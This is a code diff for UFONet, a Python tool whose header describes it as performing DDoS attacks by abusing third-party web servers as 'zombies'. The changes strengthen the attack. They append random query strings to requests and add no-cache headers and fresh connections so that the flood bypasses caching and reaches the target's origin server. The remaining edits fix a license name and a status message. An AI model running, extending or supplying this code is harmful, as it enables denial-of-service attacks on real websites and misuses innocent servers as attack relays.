@@ -4,7 +4,7 @@
 UFONet - DDoS attacks via Web Abuse (XSS/CSRF) - 2013 - by psy
 
 You should have received a copy of the GNU General Public License along
-with masxssive; if not, write to the Free Software Foundation, Inc., 51
+with UFONet; if not, write to the Free Software Foundation, Inc., 51
 Franklin St, Fifth Floor, Boston, MA  02110-1301  USA
 """
 import os, sys, re, traceback, random, time
@@ -192,12 +192,15 @@ class UFONet(object):
             c.setopt(pycurl.NOBODY,0)  # use GET
         if self.attack_mode == True:
             if options.place:
-                url_attack = zombie + options.target + "/"+ options.place # Use zombie vector to connect to a target's place
-            else:
+            # use zombie's vector to connect to a target's place and add a random query to evade cache 
+                random_hash = random.randint(1, 100000000)
+                url_attack = zombie + options.target + "/"+ options.place + "?" + str(random_hash) 
+            else:                                    
                 url_attack = zombie + options.target # Use zombie vector to connect to original target url
+                print url_attack
             c.setopt(pycurl.URL, url_attack) # GET connection on target site
             c.setopt(pycurl.NOBODY,0)  # use GET
-        c.setopt(pycurl.HTTPHEADER, ['Accept: image/gif, image/x-bitmap, image/jpeg, image/pjpeg', 'Connection: Keep-Alive', 'Content-type: application/x-www-form-urlencoded; charset=UTF-8']) # set fake headers
+        c.setopt(pycurl.HTTPHEADER, ['Accept: image/gif, image/x-bitmap, image/jpeg, image/pjpeg', 'Connection: Keep-Alive', 'Content-type: application/x-www-form-urlencoded; charset=UTF-8', 'Cache-control: no-cache', 'Pragma: no-cache', 'Pragma-directive: no-cache', 'Cache-directive: no-cache', 'Expires: 0']) # set fake headers (important: no-cache)
         c.setopt(pycurl.FOLLOWLOCATION, 1) # set follow redirects
         c.setopt(pycurl.MAXREDIRS, 10) # set max redirects
         c.setopt(pycurl.SSL_VERIFYHOST, 0) # don't verify host
@@ -205,6 +208,7 @@ class UFONet(object):
         c.setopt(pycurl.SSLVERSION, pycurl.SSLVERSION_SSLv3) # sslv3
         c.setopt(pycurl.COOKIEFILE, '/dev/null') # black magic
         c.setopt(pycurl.COOKIEJAR, '/dev/null') # black magic
+        c.setopt(pycurl.FRESH_CONNECT, 1) # important: no cache!
         b = StringIO.StringIO()
         c.setopt(pycurl.HEADERFUNCTION, b.write)
         h = StringIO.StringIO()
@@ -297,7 +301,7 @@ class UFONet(object):
                     active_zombies.append(zombie)
                 elif code_reply == "404":
                     print "Zombie:", t.netloc
-                    print "Status: Forbidden ["+ code_reply + "]"
+                    print "Status: Not Found ["+ code_reply + "]"
                     num_failed_zombies = num_failed_zombies + 1
                 else:
                     print "Zombie:", t.netloc
